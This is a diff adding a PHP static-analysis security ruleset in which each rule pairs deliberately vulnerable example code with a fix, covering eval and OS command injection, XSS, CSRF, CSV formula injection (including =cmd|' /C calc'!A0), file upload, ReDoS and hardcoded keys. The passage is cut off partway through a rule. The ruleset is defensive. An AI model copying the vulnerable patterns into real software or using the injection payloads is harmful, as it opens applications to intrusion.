@@ -1,0 +1,2930 @@
+<?xml version="1.0" encoding="UTF-8"?>
+
+<ruleset name="qaking_php" updated="">
+  <description>BridgeWeave Mobile</description>
+  <rule name="OPT.PHP.AvoidUsingRequest" message="AvoidUsingRequest: Using $_REQUEST is strongly discouraged" class="com.optimyth.qaking.php.rules.security.AvoidUsingRequest" technology="PHP" active="true">
+    <description><![CDATA[Using $_REQUEST is strongly discouraged. This super global is not recommended since it includes not only POST and GET data, but also the cookies sent by the request. This can lead to confusion and makes your code prone to mistakes, which could lead to security problems.]]></description>
+    <priority>5</priority>
+    <effort>1</effort>
+    <vulntype>Information leaks</vulntype>
+    <impl>1</impl>
+    <benefits><![CDATA[Using $_REQUEST could lead to security problems.]]></benefits>
+    <inconvenients><![CDATA[]]></inconvenients>
+    <example><![CDATA[<?php
+   $email = $_REQUEST['email'];		//VIOLATION
+?>]]></example>
+    <repair><![CDATA[<?php
+   $nombre = $_POST['nombre'];			//OK
+?>]]></repair>
+    <reference><![CDATA[https://www.owasp.org/index.php/PHP_Security_Cheat_Sheet]]></reference>
+    <properties/>
+    <idcat>OPT.CRITERIUM_VALUE.CQM.SECURITY</idcat>
+  </rule>
+  <rule name="OPT.PHP.CakePHPConfiguration" message="CakePHPConfiguration: CakePHP framework weak configuration" class="com.optimyth.qaking.php.rules.security.CakePHPConfiguration" technology="PHP" active="true">
+    <tags><![CDATA[ASVS-v4.0.2:2.8.1,ASVS-v4.0.2:2.8.6,ASVS-v4.0.2:3.3.1,ASVS-v4.0.2:3.3.2,ASVS-v4.0.2:3.3.3,ASVS-v4.0.2:3.3.4,ASVS-v4.0.2:3.6.1,ASVS-v4.0.2:3.6.2,CWEScope:Access-Control,CWEScope:Availability,CWEScope:Confidentiality,CWEScope:Integrity,Framework:CakePHP]]></tags>
+    <description><![CDATA[Weakness in CakePHP framework configuration include:
+        
+- Debug level leading to sensitive information exposure.
+- Excessive session timeout due to Security.level (CakePHP 1.x).]]></description>
+    <priority>2</priority>
+    <effort>2</effort>
+    <vulntype>Misconfiguration</vulntype>
+    <impl>1</impl>
+    <benefits><![CDATA[Avoid exposing sensitive information exposure and compromising user accounts due to overly long session timeout.]]></benefits>
+    <inconvenients><![CDATA[]]></inconvenients>
+    <example><![CDATA[<?php
+Configure::write('debug', 3);  // VIOLATION
+
+Configure::write('Security.level', 'low'); // VIOLATION
+?>]]></example>
+    <repair><![CDATA[<?php
+Configure::write('debug', 0);  // OK
+
+Configure::write('Security.level', 'high'); // OK
+?>]]></repair>
+    <reference><![CDATA[http://book.cakephp.org/1.3/en/The-Manual/Developing-with-CakePHP/Configuration.html]]></reference>
+    <normatives>
+      <security><![CDATA[CWE:489,CWE:613,OWASP:2021:A5,OWASP:2021:A7,PCI-DSS:6.5.10,PCI-DSS:6.5.5,WASC:13,WASC:47]]></security>
+    </normatives>
+    <properties>
+      <property name="checkDebug" descname="Check if information debug is active." value="true"/>
+      <property name="checkSecurityLevel" descname="Check if security level leads to overly long session timeout." value="true"/>
+    </properties>
+    <idcat>OPT.CRITERIUM_VALUE.CQM.SECURITY</idcat>
+  </rule>
+  <rule name="OPT.PHP.CodeInjection" message="CodeInjection: Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection')" class="com.optimyth.qaking.php.rules.security.CodeInjectionRule" technology="PHP" active="true">
+    <tags><![CDATA[ASVS-v4.0.2:5.2.4,ASVS-v4.0.2:5.5.4,CWEScope:Access-Control,CWEScope:Availability,CWEScope:Confidentiality,CWEScope:Integrity,CWEScope:Non-Repudiation]]></tags>
+    <description><![CDATA[Allowing user input as part of code executed by any function of the PHP engine is dangerous, as it is extremely difficult to control which code should be allowed for execution and which code should not.
+
+The rule checks that any input potentially controlled by an attacker cannot form part of code executed by one of the many API functions that execute code. No neutralization is considered, as it is almost impossible to check properly if user-controlled input does not contain unintended code.
+
+Please note that functions like preg_replace() evaluate code in some of their parameters, so they are considered targets for this rule.
+
+Rules OPT.PHP.IncludeFileInjection (for files included in the script output) and OPT.PHP.CommandInjection (for OS commands executed) are similar to this.]]></description>
+    <priority>1</priority>
+    <effort>4</effort>
+    <vulntype>Injection</vulntype>
+    <impl>1</impl>
+    <benefits><![CDATA[It improves the safety.]]></benefits>
+    <inconvenients><![CDATA[]]></inconvenients>
+    <example><![CDATA[<?php
+  $id = $_REQUEST['id'];
+  // A convoluted way to call a function, but attacker may inject all kind of side-effects evil code, like
+  // 13 && mail('hacker@hacker.org', ...
+  // and make eval() execute successfully
+  $result = eval('return my_function_call(' . $id . ');');
+?>]]></example>
+    <repair><![CDATA[<?php
+  $id = intval($_REQUEST['id']); // additional input neutralization for my_function_call
+  $result = my_function_call($id); // FIXED (eval() replaced by direct call)
+?>]]></repair>
+    <reference><![CDATA[http://cwe.mitre.org/data/definitions/95.html]]></reference>
+    <normatives>
+      <security><![CDATA[CWE:95,OWASP:2021:A3,PCI-DSS:6.5.1]]></security>
+    </normatives>
+    <properties>
+      <property name="inputs" descname="Comma-separated list of input types to consider as sources (user_input, file_input, database_input, other_input)" value="user_input"/>
+    </properties>
+    <idcat>OPT.CRITERIUM_VALUE.CQM.SECURITY</idcat>
+  </rule>
+  <rule name="OPT.PHP.CommandInjection" message="CommandInjection: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')" class="com.optimyth.qaking.php.rules.security.CommandInjectionRule" technology="PHP" active="true">
+    <tags><![CDATA[ASVS-v4.0.2:12.3.5,ASVS-v4.0.2:5.3.8,CWEScope:Availability,CWEScope:Confidentiality,CWEScope:Integrity,CWEScope:Non-Repudiation]]></tags>
+    <description><![CDATA[The software constructs all or part of an operating system (OS) command using externally-controlled input, but it does not neutralize properly that input that could modify the intended command when it is sent to a function that executes the command (e.g. exec(), system(), or the backtick operator).
+
+The rule detects a path in code between an user-input statement (source) and a command execution call (sink), with command depending on non neutralized input. This allows for an attacker to change the intended command to execute or to add a malicious extra command, executed with the application rights.
+
+A neutralization function either validates inputs and report an (neutral) error without allowing command execution, or replaces sensitive shell characters in the input to avoid that the resulting command has different semantics.
+If possible, use "accept known good" input validation strategy (whitelist).
+
+First, ask yourself if you really need to execute OS commands. Most file operations can be performed with native PHP functions.
+If you absolutely, positively need to run an external program whose name or arguments come from untrusted input, escape program names with escapeshellcmd() and arguments with escapeshellarg().]]></description>
+    <priority>1</priority>
+    <effort>4</effort>
+    <vulntype>Injection</vulntype>
+    <impl>1</impl>
+    <benefits><![CDATA[It improves the safety.]]></benefits>
+    <inconvenients><![CDATA[]]></inconvenients>
+    <example><![CDATA[if(isset($_GET['host'])) {
+  // OS Command Injection vulnerability. See http://www.aldeid.com/wiki/Command-injection-to-shell
+  // to learn how easy is to install a reverse shell exploting this vulnerability
+  $output = shell_exec( 'ping -c1 ' . $_GET['host'] );
+  echo "<pre>$output</pre>";
+}]]></example>
+    <repair><![CDATA[if(isset($_GET['host'])) {
+  // FIXED
+  $host = escapeshellarg( $_GET['host'] );
+  $output = shell_exec( 'ping -c1 ' . $host );
+  echo "<pre>$output</pre>";
+}]]></repair>
+    <reference><![CDATA[http://cwe.mitre.org/data/definitions/78.html]]></reference>
+    <normatives>
+      <security><![CDATA[CWE:77,CWE:78,CWETOP25:2021:5,OWASP:2021:A3,PCI-DSS:6.5.1,WASC:31]]></security>
+    </normatives>
+    <properties>
+      <property name="inputs" descname="Comma-separated list of input types to consider as sources (user_input, file_input, database_input, other_input)" value="user_input"/>
+    </properties>
+    <idcat>OPT.CRITERIUM_VALUE.CQM.SECURITY</idcat>
+  </rule>
+  <rule name="OPT.PHP.ConnectionStringParameterPollution" message="ConnectionStringParameterPollution: Connection string polluted with untrusted input" class="com.optimyth.qaking.php.rules.security.ConnectionStringParameterPollution" technology="PHP" active="true">
+    <tags><![CDATA[ASVS-v4.0.2:5.2.7,CWEScope:Integrity]]></tags>
+    <description><![CDATA[When the connection string for an application resource (like database, remote server, persistence entity manager...) could
+be affected by an untrusted source, not properly neutralized, the application is vulnerable to a Connection String Parameter Pollution attack.
+
+An attack targeted at this vulnerability may use special characters (like ';' or ':') to add unexpected parts to the connection string,
+for example to gain extra privileges, or to deactivate security features.
+
+"Untrusted input" means, in this context, a user-controlled application input, an environment variable, or data fetched
+from an external web source.
+
+It should be suspicious that a connection string depends on untrusted input. Normally the application configuration uses
+a fixed connection string, but other attacks, depending on where the connection string is stored (like an SQL injection or
+path traversal attack) may affect the configuration item. This rule only checks for connection strings that are constructed
+programmatically with untrusted input.]]></description>
+    <priority>1</priority>
+    <effort>2</effort>
+    <vulntype>Injection</vulntype>
+    <impl>1</impl>
+    <benefits><![CDATA[]]></benefits>
+    <inconvenients><![CDATA[]]></inconvenients>
+    <example><![CDATA[]]></example>
+    <repair><![CDATA[// Validate (white-list approach) the untrusted input combined into the connection string.]]></repair>
+    <reference><![CDATA[https://www.blackhat.com/presentations/bh-dc-10/Alonso_Chema/Blackhat-DC-2010-Alonso-Connection-String-Parameter-Pollution-wp.pdf]]></reference>
+    <normatives>
+      <security><![CDATA[CWE:15,OWASP:2021:A5,PCI-DSS:6.5.1,WASC:20]]></security>
+    </normatives>
+    <properties/>
+    <idcat>OPT.CRITERIUM_VALUE.CQM.SECURITY</idcat>
+  </rule>
+  <rule name="OPT.PHP.CrossSiteRequestForgery" message="CrossSiteRequestForgery: Cross-Site Request Forgery (CSRF)" class="com.optimyth.qaking.php.rules.security.CrossSiteRequestForgery" technology="PHP" active="true">
+    <tags><![CDATA[ASVS-v4.0.2:13.2.3,ASVS-v4.0.2:4.2.2,CWEScope:Access-Control,CWEScope:Availability,CWEScope:Confidentiality,CWEScope:Integrity,CWEScope:Non-Repudiation]]></tags>
+    <description><![CDATA[When a user is authenticated in a web site, an attacker with knowledge about the web site can perform malicious requests
+against the vulnerable site and execute actions while user remains authenticated.
+
+Usually the attacker forces an authenticated user to launch the malicious request using social engineering, or by exploiting an XSS vulnerability.
+
+In web sites developed with PHP, anti-forgery tokens, also known as request verification tokens, should be utilized to prevent CSRF attacks.
+
+Anti-forgery tokens are random values generated in the server when a form is requested, and they are included in every request,
+so the server can verify not only that user is authenticated, but that the request was originated from the application.
+
+This rule checks:
+(1) if a code fragment should be protected against CSRF attacks (that is, performs state-change operations, like database changes or file writes).
+(2) if such code is protected with one of the recommended anti-CSRF protection schemes.
+(3) If no protection is found for the candidate code, a violation is reported.]]></description>
+    <priority>2</priority>
+    <effort>2</effort>
+    <vulntype>Injection</vulntype>
+    <impl>1</impl>
+    <benefits><![CDATA[Avoid attackers to forge requests that appear to be originated from an authenticated victim ("CSRF attacks").]]></benefits>
+    <inconvenients><![CDATA[]]></inconvenients>
+    <example><![CDATA[<?php
+if (isset($_POST['Change'])) {
+  $pass_new = $_POST['password_new'];
+  $pass_conf = $_POST['password_conf'];
+  if ($pass_new == $pass_conf) {
+    // sql-injection also...
+    $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . getCurrentUser() . "';";
+    // VIOLATION, sensitive operation, no anti-CSRF control
+    $result = mysqli_query(getConnection(), $insert) or die('Database error');
+    echo "<pre>Password changed!</pre>";
+  } else {
+    echo '<pre>Passwords did not match</pre>';
+  }
+}
+?>
+<h2>Change password</h2>
+<form name="csrf_form" action="vulnerable.php" method="post">
+  <label for="password_new">New password</label>
+  <input type="password" id="password_new" name="password_new" autocomplete="off"/>
+  <label for="password_conf">Confirm password</label>
+  <input type="password" id="password_conf" name="password_conf" autocomplete="off"/>
+  <input type="submit" value="Change"/>
+</form>]]></example>
+    <repair><![CDATA[<?php
+  // You may use a 'trasparent' anti-CSRF control, like this:
+  include_once __DIR__ . '/libs/csrf/csrfprotector.php'; // FIXED
+  csrfProtector::init();
+  // Sensitive code follows...
+?>
+
+<?php
+  // Another example: NoCSRF library
+  session_start();
+  require '../nocsrf.class.php';
+  $csrf = new nocsrf;
+
+  if (isset($_POST['Change'])) {
+    if($csrf->check('csrf_token', $_POST, false, 60*19, true)) { // FIXED
+      // ... sensitive PHP code follows here ...
+    } else {
+      // log potential CSRF attack...
+      echo '<pre>Your request cannot be completed...</pre>';
+    }
+  }
+  // Generate CSRF token to use in form hidden field. An attacker cannot do this,
+  // unless exploiting existing XSS vulnerabilities
+  $token = $csfr->generate( 'csrf_token' );
+?>
+<!-- same HTML form ... -->]]></repair>
+    <reference><![CDATA[http://cwe.mitre.org/data/definitions/352.html,http://resources.infosecinstitute.com/fixing-csrf-vulnerability-in-php-application,https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet]]></reference>
+    <normatives>
+      <security><![CDATA[CWE:352,CWETOP25:2021:9,OWASP:2013:A8,PCI-DSS:6.5.9,WASC:9]]></security>
+    </normatives>
+    <properties/>
+    <idcat>OPT.CRITERIUM_VALUE.CQM.SECURITY</idcat>
+  </rule>
+  <rule name="OPT.PHP.CrossSiteScripting" message="CrossSiteScripting: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')" class="com.optimyth.qaking.php.rules.security.CrossSiteScriptingRule" technology="PHP" active="true">
+    <tags><![CDATA[ASVS-v4.0.2:5.3.3,CWEScope:Access-Control,CWEScope:Availability,CWEScope:Confidentiality,CWEScope:Integrity]]></tags>
+    <description><![CDATA[Software places user-controlled input in page content. An attacker could inject browser script code that is executed in the client browser.
+The end-user is the attacked subject, and the software is the vehicle for the attack.
+
+There are three kinds of XSS:
+* Reflected XSS: Attacker causes victim to supply malicious content to a vulnerable web application, which renders HTML content
+  embedding a malicious script executed in victim's browser. A variation of this is named DOM-based XSS, where the vulnerable software
+  does not generate content depending on user input but include script code that use user-controlled input.
+
+* Persistent XSS: Attacker provides malicious content to vulnerable application, which is stored somewhere.
+  When other user access to vulnerable pages that embed without proper neutralization the attacker content, script code
+  is executed in the victim's browser. For this, you should add other input kinds (e.g. file_input and/or database_input)
+  to the 'inputs' rule property.
+
+The script executed in the victim's browser could perform malicious activities, like stealing active authentication tokens
+(sometimes in the form of cookies) and performing operations on a insecure webapp (on behalf of the victim) that trusts
+too much identity artifacts in browser and do not request additional authorization for operations ('Cross-Site Request Forgery attack', CSRF).
+
+Many browsers could limit the damage via security restrictions (e.g. 'same origin policy'), but user browsers generally
+allow scripting languages (e.g. JavaScript) in their browsers (disabling JavaScript severely limits a web site).]]></description>
+    <priority>1</priority>
+    <effort>3</effort>
+    <vulntype>Injection</vulntype>
+    <impl>1</impl>
+    <benefits><![CDATA[It improves the safety.]]></benefits>
+    <inconvenients><![CDATA[]]></inconvenients>
+    <example><![CDATA[<?php
+  $username = $_GET['username'];
+  echo '<div class="header"> Welcome, ' . $username . '</div>';  // VIOLATION emitted here
+?>]]></example>
+    <repair><![CDATA[<?php
+  // FIXED: escape comments before display
+  $username = $_GET['username'];
+  echo htmlspecialchars($username);
+?>]]></repair>
+    <reference><![CDATA[http://cwe.mitre.org/data/definitions/79.html]]></reference>
+    <normatives>
+      <security><![CDATA[CWE:79,CWETOP25:2021:2,OWASP:2021:A3,PCI-DSS:6.5.7]]></security>
+    </normatives>
+    <properties>
+      <property name="inputs" descname="Comma-separated list of input types to consider as sources (user_input, file_input, database_input, other_input)" value="user_input"/>
+    </properties>
+    <idcat>OPT.CRITERIUM_VALUE.CQM.SECURITY</idcat>
+  </rule>
+  <rule name="OPT.PHP.CsvFormulaInjection" message="CsvFormulaInjection: CSV Excel macro injection" class="com.optimyth.qaking.php.rules.security.CsvFormulaInjection" technology="PHP" active="true">
+    <tags><![CDATA[ASVS-v4.0.2:1.5.4,ASVS-v4.0.2:13.1.1,ASVS-v4.0.2:14.4.2,ASVS-v4.0.2:14.4.4,ASVS-v4.0.2:14.4.6,ASVS-v4.0.2:5.2.1,ASVS-v4.0.2:5.3.1,CWEScope:Access-Control,CWEScope:Availability,CWEScope:Confidentiality,CWEScope:Integrity]]></tags>
+    <description><![CDATA[Web applications often allow the user to download content in CSV (or Excel) format.
+When the user opens the CSV file in an external application, like Microsoft Excel or Open Office, cells
+containing formulas / macros may be executed, leading to unintended code execution in the end-user machine.
+
+When the PHP application generates CSV content from untrusted sources, an attacker may inject (using reflected contents,
+or contents previously stored in application database) formulas or macros.
+
+For example, with Excel, a cell with =cmd|' /C calc'!A0 will execute calculator.
+
+Although external applications typically open a security notice (sometimes AFTER executing the injected formulas),
+typically end-users do not care on the security notice.]]></description>
+    <priority>1</priority>
+    <effort>3</effort>
+    <vulntype>Injection</vulntype>
+    <impl>1</impl>
+    <benefits><![CDATA[]]></benefits>
+    <inconvenients><![CDATA[]]></inconvenients>
+    <example><![CDATA[<?php
+  header('Content-Type: text/csv; charset=utf-8'); // application/csv works also
+  header('Content-Disposition: attachment; filename=exported.csv');
+  $output = fopen('php://output', 'w'); // content written to HTTP body
+
+  include('../../config.php');
+  $rows = mysql_query('SELECT itemcode, itemname, category, price FROM products');
+
+  fputcsv($output, array('itemcode', 'itemname', 'category', 'price'));
+
+  while ($row = mysql_fetch_assoc($rows)) {
+    fputcsv($output, $row); // VIOLATION
+  }
+
+  fclose($output);
+?>]]></example>
+    <repair><![CDATA[<?php
+  // ... code up to mysql_query() is the same ...
+
+  // Escape text fields that may contain injected expressions
+  $num = 0;
+  $escape_pat = '/\s*([=+\-@])(.+)/';
+  $replace = '\'$1$2';
+  while ($row = mysql_fetch_assoc($rows)) {
+    $prod[$num]['itemcode'] = intval($row['itemcode']);
+    $prod[$num]['itemname'] = preg_replace($escape_pat, $replace, $row['itemname']);
+    $prod[$num]['category'] = preg_replace($escape_pat, $replace, $row['category']);
+    $prod[$num]['price'] = floatval($row['price']);
+    $num++;
+  }
+
+  fputcsv($output, array('itemcode', 'itemname', 'category', 'price'));
+
+  foreach($prod as $product) {
+    fputcsv($output, $product); // FIXED
+  }
+
+  fclose($output);
+?>]]></repair>
+    <reference><![CDATA[https://www.owasp.org/index.php/CSV_Excel_Macro_Injection,https://www.contextis.com/resources/blog/comma-separated-vulnerabilities/]]></reference>
+    <normatives>
+      <security><![CDATA[CWE:116,OWASP:2021:A3]]></security>
+    </normatives>
+    <properties>
+      <property name="inputs" value="user_input,database_input,file_input"/>
+    </properties>
+    <idcat>OPT.CRITERIUM_VALUE.CQM.SECURITY</idcat>
+  </rule>
+  <rule name="OPT.PHP.DangerousFileUpload" message="DangerousFileUpload: Unrestricted Upload of File with Dangerous Type" class="com.optimyth.qaking.php.rules.security.DangerousFileUpload" technology="PHP" active="true">
+    <tags><![CDATA[ASVS-v4.0.2:12.2.1,ASVS-v4.0.2:12.5.2,ASVS-v4.0.2:13.1.5,CWEScope:Availability,CWEScope:Confidentiality,CWEScope:Integrity]]></tags>
+    <description><![CDATA[The software allows to upload files without restricting the content uploaded and/or where the uploaded content is stored.
+
+If attacker may influence where on filesystem the file with uploaded content is written, it may overwrite configuration
+and other sensitive system files (this depends on the permissions granted to the web server process).
+
+If attacker may influence, on the file path to write, not the full path, but part of it (for example, the file extension),
+the attacker may choose .php or similar extension. If the target resource is available for the attacker, the app is vulnerable
+to an indirect code injection attack.
+
+If the uploaded file is included (as a web resource) in web content, the attacker may even succeed in a stored cross-site scripting
+attack targeted at a victim's browser.
+
+The attacker may use unrestricted file upload sites for file space denial-of-service, automatic command execution
+(in vulnerable virus scanner tools that try to process the uploaded malicious content), and more esoteric attacks.
+
+This rule checks for some explicit validations are performed on the uploaded file in PHP (array $_FILES).
+
+The validations that are checked are:
+- Input size check, to ensure that the content size does not exceed a limit.
+
+- If the file is stored, and something from HTTP message is used to compile the filepath, at least a proper neutralization
+  is done (for example, restricting filename), or the stored filename is a generated one.
+
+- Any check on the uploaded contents, before storage, is accepted as a proper neutralization.
+
+- Any additional checks (on 'type' field, filename or extension patterns, etc.) are ignored, as they typically do
+  not neutralize most of the attacks.
+
+Remember that a "file upload", in technical terms, is an HTTP message with Content-Type=multipart/form-data.
+Each form item is a part with a Content-Disposition header. A file HTML control provides a filename value, and Content-Type header.
+But remember that no single bit from a HTTP message could be trusted, as our willy attacker may craft the HTML message entirely.
+So the message may lie about the true content type, the filename could be anything (even an syntactically invalid filename),
+the content could be as large as target webapp accepts, etc.]]></description>
+    <priority>1</priority>
+    <effort>3</effort>
+    <vulntype>File handling</vulntype>
+    <impl>1</impl>
+    <benefits><![CDATA[Force restricting the uploaded content, to reduce the risk with file uploading.]]></benefits>
+    <inconvenients><![CDATA[]]></inconvenients>
+    <example><![CDATA[<?php
+  $uploaded = $_FILES['uploaded'];
+  $tmpFile = $uploaded['tmp_name'];
+  $tmpFile = $_FILES['uploaded']['tmp_name'];
+  $targetFile = UPLOAD_DIR . basename($uploaded['name']);
+
+  if(move_uploaded_file($tmpFile, $targetFile)) { // VIOLATION
+    // ...
+  }
+?>]]></example>
+    <repair><![CDATA[<?php
+  $uploaded = $_FILES['uploaded'];
+  $tmpFile = $uploaded['tmp_name'];
+  // Generate a unique file path, not using directly the user filename
+  $targetFile = UPLOAD_DIR . md5( uniqid() . $uploaded['name']);
+  $uploadedSize = $uploaded['size'];
+  $finfo = finfo_open(FILEINFO_MIME_TYPE);
+  $contentType = finfo_file($finfo, $tmpFile);
+
+  if(in_array($contentType, $allowedTypes) && $uploadedSize < MAX_UPLOAD_SIZE) {
+
+    // For uploaded images, it is safer to try to create image from file
+    // to ensure that contents are really an image, not executable code
+    if(!$img = imagecreatefromgif()) {
+      trigger_error('Not a GIF image', E_USER_WARNING);
+      // ... handle error ...
+    }
+    // Alternative for image uploads: fetch image info
+    $imgInfo = getimagesize($tmpFile);
+    $contentType = $imgInfo['mime'];
+
+    if(move_uploaded_file($tmpFile, $targetFile)) {
+      // ...
+    }
+  } else {
+    // handle upload error
+  }
+?>]]></repair>
+    <reference><![CDATA[http://php.net/manual/es/security.filesystem.php,https://cwe.mitre.org/data/definitions/434.html,https://www.helpnetsecurity.com/dl/articles/php-file-upload.pdf]]></reference>
+    <normatives>
+      <security><![CDATA[CWE:434,CWETOP25:2021:10]]></security>
+    </normatives>
+    <properties/>
+    <idcat>OPT.CRITERIUM_VALUE.CQM.SECURITY</idcat>
+  </rule>
+  <rule name="OPT.PHP.DoSRegexp" message="DoSRegexp: Prevent denial of service attack through malicious regular expression ('Regex Injection')]" class="com.optimyth.qaking.php.rules.security.DoSRegexp" technology="PHP" active="true">
+    <tags><![CDATA[ASVS-v4.0.2:12.1.1,CWEScope:Access-Control,ReDoS,denial-of-service]]></tags>
+    <description><![CDATA[Regular expressions are a formal language for identifying strings of text, parsing, and matching them.
+
+Most regular expressions engines are built over a non-deterministic Finite Automaton (NFA). They use backtracking and,
+while these regular expression engines can quickly confirm a positive match, confirming a negative match can take much more longer.
+
+There are lots of well-known regular expression patterns that, using selected inputs, take a time exponentially related to input size.
+
+An attacker with total or partial control over a regular expression may carry out a denial-of-service attacks.]]></description>
+    <priority>1</priority>
+    <effort>2</effort>
+    <vulntype>Injection</vulntype>
+    <impl>1</impl>
+    <benefits><![CDATA[Prevent denial of service attacks due to regular expressions.]]></benefits>
+    <inconvenients><![CDATA[]]></inconvenients>
+    <example><![CDATA[<?php
+  // Security check: password should not contain username: ReDoS vulnerable !
+  $username = $_GET['username'];
+  $password = $_GET['password'];
+  // VIOLATION, attacker may inject an evil pattern in username
+  if(preg_match('/.*(' . $username . ').*/', $password)) {
+    report_username_contains_password($username, $password);
+  }
+  // ...
+  // VIOLATION, catastrophic backtracking
+  $ret = preg_match('/(?!^[0-9]*$)(?!^[a-zA-Z]*$)^([a-zA-Z0-9]+){8,10}/', $username);
+?>]]></example>
+    <repair><![CDATA[<?php
+  // Security check: password should not contain username
+  $username = $_GET['username'];
+  $password = $_GET['password'];
+  // FIXED, use substring matching
+  if(strpos($password, $username) !== false) {
+    report_username_contains_password($username, $password);
+  }
+  // ...
+  // FIXED, safe regex
+  $ret = preg_match('/(?!^[0-9]*$)(?!^[a-zA-Z]*$)^[a-zA-Z0-9]{8,10}/', $username);
+?>]]></repair>
+    <reference><![CDATA[https://cwe.mitre.org/data/definitions/400.html,https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS]]></reference>
+    <normatives>
+      <security><![CDATA[CWE:400,CWETOP25:2021:27,OWASP:2004:A9]]></security>
+    </normatives>
+    <properties/>
+    <idcat>OPT.CRITERIUM_VALUE.CQM.SECURITY</idcat>
+  </rule>
+  <rule name="OPT.PHP.ExternalVariableModification" message="ExternalVariableModification: PHP External Variable Modification" class="com.optimyth.qaking.php.rules.security.ExternalVariableModification" technology="PHP" active="true">
+    <tags><![CDATA[CWEScope:Integrity]]></tags>
+    <description><![CDATA[PHP provides functions for parsing data in HTTP request message (typically the query string), like parse_str() and mb_parse_str().
+These functions may have an optional second array argument provided, where the parameters in data are stored.
+When that second argument is not provided, the functions create/overwrite variables (in local scope for parse_str,
+globals for mb_parse_str).
+
+If the string to be parsed comes from untrusted input (like the $_SERVER['QUERY_STRING']), an attacker may provide
+parameters that overwrite local/global variables, that when used later by the PHP code may produce unexpected results,
+resulting in potential file include, code execution or cross-site scripting vulnerabilities.
+
+Note: Since PHP 7.2.0, usage of parse_str() without a second parameter now emits an E_DEPRECATED notice.]]></description>
+    <priority>1</priority>
+    <effort>1</effort>
+    <vulntype>Injection</vulntype>
+    <impl>1</impl>
+    <benefits><![CDATA[]]></benefits>
+    <inconvenients><![CDATA[]]></inconvenients>
+    <example><![CDATA[<?php
+  $template = prepareOutput();
+  $qs = $_SERVER['QUERY_STRING'];
+  // VIOLATION, attacker may overwrite template and other vars
+  mb_parse_str($qs);
+
+  // do something with the parsed global vars...
+  echo render($template);
+?>]]></example>
+    <repair><![CDATA[<?php
+  $template = prepareOutput($arr);
+  $qs = $_SERVER['QUERY_STRING'];
+  mb_parse_str($qs, $arr); // FIXED
+
+  // do something with parsed entries in $arr
+  echo render($template, $arr);
+?>]]></repair>
+    <reference><![CDATA[https://cwe.mitre.org/data/definitions/473.html]]></reference>
+    <normatives>
+      <security><![CDATA[CWE:473,OWASP:2021:A3,PCI-DSS:6.5.6]]></security>
+    </normatives>
+    <properties/>
+    <idcat>OPT.CRITERIUM_VALUE.CQM.SECURITY</idcat>
+  </rule>
+  <rule name="OPT.PHP.HardcodedCryptoKey" message="HardcodedCryptoKey: Use of Hard-coded Cryptographic Key" class="com.optimyth.qaking.php.rules.security.HardcodedCryptoKey" technology="PHP" active="true">
+    <tags><![CDATA[CWEScope:Confidentiality,crypto,essential]]></tags>
+    <description><![CDATA[Never hard-code cryptographic keys (or passwords used to generate them) in your program.
+
+Crypto keys are used for encryption/decryption, for generation of message authentication codes (MAC), during generation
+of password-based encryption keys (the password is the "crypto key" that generates key material for the cipher), and other usages.
+Source code is the worst place for key storage, as any change in keys needs recompilation, and it is easy to reverse-engineer
+an application binary to learn any keys or secrets that may be embedded in it.
+
+Instead, store crypto keys in some private location. For non-critical web applications, a file with proper permissions,
+out of the resources served by the web application, could be enough for storing cryptographic keys.
+A crypto key should not be stored in configuration files, in general.
+
+Some data used in cryptographic operations (like initial vector for block ciphers, salt for password hashes, etc.)
+are not "private", and it is recommended to generate a good random instance at the origin, and add it to the message
+in plaintext, so the destination may use it. The security depends on properly protecting the "secret" thing
+(private key in a public/private keypair, encryption key in a symmetric cipher, key in an HMAC, etc.).
+
+Long-term cryptographic keys (in contrast with ephemeral ones), are better stored in a safe key storage.
+Private keys in a public/private keypair should NEVER be unprotected (in raw form) and they should be stored in an even
+safer key storage (the impact for a compromise of a private key is typically huge and brutal). For highly sensitive keys,
+a hardware security module, where the key is generated by the hardware and the private/symmetric key never leaves the
+hardware is a good alternative.]]></description>
+    <priority>2</priority>
+    <effort>3</effort>
+    <vulntype>Encryption and randomness</vulntype>
+    <impl>1</impl>
+    <benefits><![CDATA[]]></benefits>
+    <inconvenients><![CDATA[]]></inconvenients>
+    <example><![CDATA[<?php
+  // hardcoded key, in hex
+  $key = pack('H*', 'bcb04b7e103a0cd8b54763051cef08bc55abe029fdebae5e1d417e2ffb2a00a3');
+  $iv_size = mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC);
+  $iv = mcrypt_create_iv($iv_size, MCRYPT_RAND);
+  $ciphertext = mcrypt_encrypt(MCRYPT_RIJNDAEL_128, $key, $str, MCRYPT_MODE_CBC, $iv); // VIOLATION
+?>]]></example>
+    <repair><![CDATA[<?php
+  // FIXED: key in protected file
+  $hex_key = file_get_contents(KEYS_FILE);
+  $key = pack('H*', $hex_key);
+  $iv_size = mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC);
+  $iv = mcrypt_create_iv($iv_size, MCRYPT_RAND);
+  $ciphertext = mcrypt_encrypt(MCRYPT_RIJNDAEL_128, $key, $str, MCRYPT_MODE_CBC, $iv);
+?>]]></repair>
+    <reference><![CDATA[https://cwe.mitre.org/data/definitions/321.html]]></reference>
+    <normatives>
+      <security><![CDATA[CWE:321,OWASP-M:2016:M5,OWASP:2021:A2,PCI-DSS:6.3.1,WASC:13]]></security>
+    </normatives>
+    <properties/>
+    <idcat>OPT.CRITERIUM_VALUE.CQM.SECURITY</idcat>
+  </rule>
+  <rule name="OPT.PHP.HardcodedSalt" message="HardcodedSalt: Use of hardcoded salt" class="com.optimyth.qaking.php.rules.security.HardcodedSalt" technology="PHP" active="true">
+    <tags><![CDATA[CWEScope:Access-Control]]></tags>
+    <description><![CDATA[The software uses a one-way cryptographic hash against an input that should not be reversible, such as a password,
+but the software uses a predictable salt as part of the input.
+
+A hardcoded, fixed salt makes easier for attackers to pre-compute a dictionary of common passwords and their hash values,
+effectively disabling the protection that an unpredictable salt would provide.
+
+The rule will report any usage of a hash function that expects a salt, when the salt is hardcoded.]]></description>
+    <priority>2</priority>
+    <effort>3</effort>
+    <vulntype>Encryption and randomness</vulntype>
+    <impl>1</impl>
